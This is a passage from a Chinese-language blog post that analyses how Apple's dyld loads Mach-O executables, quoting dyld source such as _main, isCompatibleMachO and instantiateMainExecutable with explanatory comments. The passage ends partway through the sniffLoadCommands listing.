<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/dyld_macho_load/UMLClassDiagram-macho_header.png" alt="macho_header"></p>
<h2 id="1-1-2_ImageLoader">1.1.2  ImageLoader</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// ImageLoader is an abstract base class.  To support loading a particular executable</span></span><br><span class="line"><span class="comment">// file format, you make a concrete subclass of ImageLoader.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// For each executable file (dynamic shared object) in use, an ImageLoader is instantiated.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The ImageLoader base class does the work of linking together images, but it knows nothing</span></span><br><span class="line"><span class="comment">// about any particular file format.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">class</span>  &#123;ImageLoader</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>每一个加载的mach-o文件都会存在这样一个<code>ImageLoader</code>的实例。具体代码太多参考<a href="http://opensource.apple.com/tarballs/dyld/dyld-360.18.tar.gz" target="_blank" rel="external">源码</a>。</p>
<p>每一种具体的mach-o文件都会继承<code>ImageLoader</code>类，大致继承关系如图所示：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/dyld_macho_load/Butterfly-ImageLoader.png" alt="mageLoder"></p>
<p>在加载时会根据mach-o的格式不同选择不同的实例。</p>
<h2 id="1-2_源码分析">1.2 源码分析</h2><h3 id="1-2-1__main">1.2.1 _main</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Entry point for dyld.  The kernel loads dyld and jumps to __dyld_start which</span></span><br><span class="line"><span class="comment">// sets up some registers and call this function.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns address of main() in target program which __dyld_start jumps to</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">uintptr_t</span></span><br><span class="line">_main(<span class="keyword">const</span> macho_header* mainExecutableMH, <span class="keyword">uintptr_t</span> mainExecutableSlide, </span><br><span class="line">		<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[], <span class="keyword">const</span> <span class="keyword">char</span>* envp[], <span class="keyword">const</span> <span class="keyword">char</span>* apple[], </span><br><span class="line">		<span class="keyword">uintptr_t</span>* startGlue)</span><br><span class="line">&#123;</span><br><span class="line">  ... <span class="comment">//对全局变量一通操作</span></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="comment">// add dyld itself to UUID list</span></span><br><span class="line">		addDyldImageToUUIDList();</span><br><span class="line">		CRSetCrashLogMessage(sLoadingCrashMessage);</span><br><span class="line">		<span class="comment">// instantiate ImageLoader for main executable</span></span><br><span class="line">		sMainExecutable = instantiateFromLoadedImage(mainExecutableMH, mainExecutableSlide, sExecPath);<span class="comment">//加载MACHO到image</span></span><br><span class="line">		... <span class="comment">//不关心了</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在调用<code>_main</code>函数之后，大致做了这么几件事情：</p>
<ul>
<li>选择运行环境(IOS模拟器)</li>
<li>初始化数据、设置全局变量，上下文信息</li>
<li>检测文件是否<code>Restricted</code></li>
</ul>
<p>走完这些流程，就会调用<code>instantiateFromLoadedImage</code>函数开始加载mach-o并实例化为<code>ImageLoader</code>。</p>
<h3 id="1-2-2_instantiateFromLoadedImage">1.2.2 instantiateFromLoadedImage</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The kernel maps in main executable before dyld gets control.  We need to </span></span><br><span class="line"><span class="comment">// make an ImageLoader* for the already mapped in main executable.</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> ImageLoader* <span class="title">instantiateFromLoadedImage</span><span class="params">(<span class="keyword">const</span> macho_header* mh, uintptr_t slide, <span class="keyword">const</span> <span class="keyword">char</span>* path)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">// try mach-o loader</span></span><br><span class="line">	<span class="keyword">if</span> ( isCompatibleMachO((<span class="keyword">const</span> <span class="keyword">uint8_t</span>*)mh, path) ) &#123;<span class="comment">//检测是否合法</span></span><br><span class="line">		ImageLoader* image = ImageLoaderMachO::instantiateMainExecutable(mh, slide, path, gLinkContext); <span class="comment">//加载</span></span><br><span class="line">		addImage(image);</span><br><span class="line">		<span class="keyword">return</span> image;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">throw</span> <span class="string">"main executable not a known format"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数的逻辑非常的简单，总过做了三件事：</p>
<ul>
<li>检测macho文件是否符合条件</li>
<li>初始化实例</li>
<li>添加image到管理的模块中</li>
</ul>
<h3 id="1-2-3_isCompatibleMachO">1.2.3 isCompatibleMachO</h3><p>先看<code>isCompatibleMacho</code>函数。</p>
<p>通过注释可以知道，满足下面三个条件，即可认为是符合要求的mach-o文件。</p>
<ol>
<li><code>mach_header</code>中的<code>subtype</code>当前CPU版本是否支持。</li>
</ol>
<ol>
<li><p><code>mach_header</code>中的<code>subtype</code>和当前正在运行的CPU版本相同。</p>
</li>
<li><p><code>mach_header</code>中的<code>subtype</code>在该CPU的所有版本都可以处理。</p>
</li>
</ol>
<p>内核中<code>machine.h</code>定义了<code>CPU_TYPE</code>与<code>CPU_SUBTYPE</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_ANY		((cpu_type_t) -<span class="number">1</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_VAX		((cpu_type_t) <span class="number">1</span>)</span></span><br><span class="line"><span class="comment">/* skip				((cpu_type_t) 2)	*/</span></span><br><span class="line"><span class="comment">/* skip				((cpu_type_t) 3)	*/</span></span><br><span class="line"><span class="comment">/* skip				((cpu_type_t) 4)	*/</span></span><br><span class="line"><span class="comment">/* skip				((cpu_type_t) 5)	*/</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	CPU_TYPE_MC680x0	((cpu_type_t) <span class="number">6</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_X86		((cpu_type_t) <span class="number">7</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_I386		CPU_TYPE_X86		<span class="comment">/* compatibility */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	CPU_TYPE_X86_64		(CPU_TYPE_X86 | CPU_ARCH_ABI64)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* skip CPU_TYPE_MIPS		((cpu_type_t) 8)	*/</span></span><br><span class="line"><span class="comment">/* skip 			((cpu_type_t) 9)	*/</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_MC98000	((cpu_type_t) <span class="number">10</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_HPPA           ((cpu_type_t) <span class="number">11</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_ARM		((cpu_type_t) <span class="number">12</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_ARM64          (CPU_TYPE_ARM | CPU_ARCH_ABI64)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_MC88000	((cpu_type_t) <span class="number">13</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_SPARC		((cpu_type_t) <span class="number">14</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_I860		((cpu_type_t) <span class="number">15</span>)</span></span><br><span class="line"><span class="comment">/* skip	CPU_TYPE_ALPHA		((cpu_type_t) 16)	*/</span></span><br><span class="line"><span class="comment">/* skip				((cpu_type_t) 17)	*/</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_POWERPC		((cpu_type_t) <span class="number">18</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_TYPE_POWERPC64		(CPU_TYPE_POWERPC | CPU_ARCH_ABI64)</span></span><br><span class="line"><span class="comment">/*</span><br><span class="line"> *	Machine subtypes (these are defined here, instead of in a machine</span><br><span class="line"> *	dependent directory, so that any program can get all definitions</span><br><span class="line"> *	regardless of where is it compiled).</span><br><span class="line"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span><br><span class="line"> * Capability bits used in the definition of cpu_subtype.</span><br><span class="line"> */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_MASK	<span class="number">0xff000000</span>	<span class="comment">/* mask for feature flags */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_LIB64	<span class="number">0x80000000</span>	<span class="comment">/* 64 bit libraries */</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span><br><span class="line"> *	Object files that are hand-crafted to run on any</span><br><span class="line"> *	implementation of an architecture are tagged with</span><br><span class="line"> *	CPU_SUBTYPE_MULTIPLE.  This functions essentially the same as</span><br><span class="line"> *	the "ALL" subtype of an architecture except that it allows us</span><br><span class="line"> *	to easily find object files that may need to be modified</span><br><span class="line"> *	whenever a new implementation of an architecture comes out.</span><br><span class="line"> *</span><br><span class="line"> *	It is the responsibility of the implementor to make sure the</span><br><span class="line"> *	software handles unsupported implementations elegantly.</span><br><span class="line"> */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	CPU_SUBTYPE_MULTIPLE		((cpu_subtype_t) -<span class="number">1</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_LITTLE_ENDIAN	((cpu_subtype_t) <span class="number">0</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_BIG_ENDIAN		((cpu_subtype_t) <span class="number">1</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span><br><span class="line"> *     Machine threadtypes.</span><br><span class="line"> *     This is none - not defined - for most machine types/subtypes.</span><br><span class="line"> */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_THREADTYPE_NONE		((cpu_threadtype_t) <span class="number">0</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span><br><span class="line"> *	VAX subtypes (these do *not* necessary conform to the actual cpu</span><br><span class="line"> *	ID assigned by DEC available via the SID register).</span><br><span class="line"> */</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	CPU_SUBTYPE_VAX_ALL	((cpu_subtype_t) <span class="number">0</span>) </span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_VAX780	((cpu_subtype_t) <span class="number">1</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_VAX785	((cpu_subtype_t) <span class="number">2</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_VAX750	((cpu_subtype_t) <span class="number">3</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_VAX730	((cpu_subtype_t) <span class="number">4</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_UVAXI	((cpu_subtype_t) <span class="number">5</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_UVAXII	((cpu_subtype_t) <span class="number">6</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_VAX8200	((cpu_subtype_t) <span class="number">7</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_VAX8500	((cpu_subtype_t) <span class="number">8</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_VAX8600	((cpu_subtype_t) <span class="number">9</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_VAX8650	((cpu_subtype_t) <span class="number">10</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_VAX8800	((cpu_subtype_t) <span class="number">11</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> CPU_SUBTYPE_UVAXIII	((cpu_subtype_t) <span class="number">12</span>)</span></span><br></pre></td></tr></table></figure>
<p>简单的说<code>cputype</code>就是cpu的平台，<code>x86</code>、<code>ARM</code>、<code>PROWERPC</code>等。而<code>subtype</code>就是不同平台的不同版本，例如<code>arm6</code>、<code>arm7</code>。</p>
<p></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isCompatibleMachO</span><span class="params">(<span class="keyword">const</span> uint8_t* firstPage, <span class="keyword">const</span> <span class="keyword">char</span>* path)</span></span><br><span class="line"></span>&#123;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> CPU_SUBTYPES_SUPPORTED</span></span><br><span class="line">  	<span class="comment">// 支持检测CPU版本的情况</span></span><br><span class="line">	<span class="comment">// It is deemed compatible if any of the following are true:</span></span><br><span class="line">	<span class="comment">//  1) mach_header subtype is in list of compatible subtypes for running processor</span></span><br><span class="line">	<span class="comment">//  2) mach_header subtype is same as running processor subtype</span></span><br><span class="line">	<span class="comment">//  3) mach_header subtype runs on all processor variants</span></span><br><span class="line">	<span class="keyword">const</span> mach_header* mh = (mach_header*)firstPage;</span><br><span class="line">	<span class="keyword">if</span> ( mh-&gt;magic == sMainExecutableMachHeader-&gt;magic ) &#123; </span><br><span class="line">		<span class="comment">//传入的mach-o文件的magic是否和加载的主mach-o文件是否相同</span></span><br><span class="line">		<span class="comment">//这一次运行到这里的时候mh与sMainExecutableMacHeader应该是指向同一个mach-o的</span></span><br><span class="line">		<span class="keyword">if</span> ( mh-&gt;cputype == sMainExecutableMachHeader-&gt;cputype ) &#123;</span><br><span class="line">			<span class="keyword">if</span> ( (mh-&gt;cputype &amp; CPU_TYPE_MASK) == sHostCPU ) &#123;</span><br><span class="line">				<span class="comment">//加载的mh是否在当前平台可以运行。</span></span><br><span class="line">				<span class="comment">// get preference ordered list of subtypes that this machine can use</span></span><br><span class="line">				<span class="keyword">const</span> <span class="keyword">cpu_subtype_t</span>* subTypePreferenceList = findCPUSubtypeList(mh-&gt;cputype, sHostCPUsubtype);</span><br><span class="line">				<span class="keyword">if</span> ( subTypePreferenceList != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">                  	  <span class="comment">//如果该CPU的版本存在一个检测的列表，则进行检测</span></span><br><span class="line">					<span class="comment">// if image's subtype is in the list, it is compatible</span></span><br><span class="line">					<span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">cpu_subtype_t</span>* p = subTypePreferenceList; *p != CPU_SUBTYPE_END_OF_LIST; ++p) &#123;</span><br><span class="line">						<span class="keyword">if</span> ( *p == mh-&gt;cpusubtype )</span><br><span class="line">							<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="comment">// have list and not in list, so not compatible</span></span><br><span class="line">					throwf(<span class="string">"incompatible cpu-subtype: 0x%08X in %s"</span>, mh-&gt;cpusubtype, path);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="comment">// unknown cpu sub-type, but if exact match for current subtype then ok to use</span></span><br><span class="line">				<span class="keyword">if</span> ( mh-&gt;cpusubtype == sHostCPUsubtype ) </span><br><span class="line">                  	<span class="comment">//加载的mh与当前运行环境的CPU版本相同</span></span><br><span class="line">					<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// cpu type has no ordered list of subtypes</span></span><br><span class="line">             <span class="comment">// 这两种CPU支持所有版本的mach-o文件</span></span><br><span class="line">			<span class="keyword">switch</span> (mh-&gt;cputype) &#123;</span><br><span class="line">				<span class="keyword">case</span> CPU_TYPE_I386:</span><br><span class="line">				<span class="keyword">case</span> CPU_TYPE_X86_64:</span><br><span class="line">					<span class="comment">// subtypes are not used or these architectures</span></span><br><span class="line">					<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="comment">// For architectures that don't support cpu-sub-types</span></span><br><span class="line">	<span class="comment">// this just check the cpu type.</span></span><br><span class="line">  	<span class="comment">// 不支持检测CPU版本的时候，就只判断是mh的版本与CPU相同。</span></span><br><span class="line">	<span class="keyword">const</span> mach_header* mh = (mach_header*)firstPage;</span><br><span class="line">	<span class="keyword">if</span> ( mh-&gt;magic == sMainExecutableMachHeader-&gt;magic ) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( mh-&gt;cputype == sMainExecutableMachHeader-&gt;cputype ) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1-2-4_instantiateMainExecutable">1.2.4 instantiateMainExecutable</h3><p>函数流程主要是通过<code>sniffloadcommands</code>来判断mach-o文件是否是压缩过的，然后选择相应的类进行实例化。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create image for main executable</span></span><br><span class="line">ImageLoader* ImageLoaderMachO::instantiateMainExecutable(<span class="keyword">const</span> macho_header* mh, <span class="keyword">uintptr_t</span> slide, <span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> LinkContext&amp; context)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//dyld::log("ImageLoader=%ld, ImageLoaderMachO=%ld, ImageLoaderMachOClassic=%ld, ImageLoaderMachOCompressed=%ld\n",</span></span><br><span class="line">	<span class="comment">//	sizeof(ImageLoader), sizeof(ImageLoaderMachO), sizeof(ImageLoaderMachOClassic), sizeof(ImageLoaderMachOCompressed));</span></span><br><span class="line">	<span class="keyword">bool</span> compressed;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> segCount;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> libCount;</span><br><span class="line">	<span class="keyword">const</span> linkedit_data_command* codeSigCmd;</span><br><span class="line">	<span class="keyword">const</span> encryption_info_command* encryptCmd;</span><br><span class="line">	sniffLoadCommands(mh, path, <span class="literal">false</span>, &amp;compressed, &amp;segCount, &amp;libCount, context, &amp;codeSigCmd, &amp;encryptCmd); <span class="comment">//判断macho是普通的还是压缩的</span></span><br><span class="line">	<span class="comment">// instantiate concrete class based on content of load commands</span></span><br><span class="line">	<span class="keyword">if</span> ( compressed ) </span><br><span class="line">		<span class="keyword">return</span> ImageLoaderMachOCompressed::instantiateMainExecutable(mh, slide, path, segCount, libCount, context);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> SUPPORT_CLASSIC_MACHO</span></span><br><span class="line">		<span class="keyword">return</span> ImageLoaderMachOClassic::instantiateMainExecutable(mh, slide, path, segCount, libCount, context);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">		<span class="keyword">throw</span> <span class="string">"missing LC_DYLD_INFO load command"</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数的逻辑也非常简单。流程图如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/dyld_macho_load/instantiateMainExecutable.png" alt="instantiateMainExecutable"></p>
<h3 id="1-2-5_sniffLoadCommands">1.2.5 sniffLoadCommands</h3><p>这个函数主要做了两件事情：</p>
<ul>
<li>判断Mach-O文件是<code>classic</code>的还是<code>compressed</code>的。</li>
<li>获取mach-O文件的<code>segment</code>的数量。</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// determine if this mach-o file has classic or compressed LINKEDIT and number of segments it has</span></span><br><span class="line"><span class="keyword">void</span> ImageLoaderMachO::sniffLoadCommands(<span class="keyword">const</span> macho_header* mh, <span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">bool</span> inCache, <span class="keyword">bool</span>* compressed,</span><br><span class="line">											<span class="keyword">unsigned</span> <span class="keyword">int</span>* segCount, <span class="keyword">unsigned</span> <span class="keyword">int</span>* libCount, <span class="keyword">const</span> 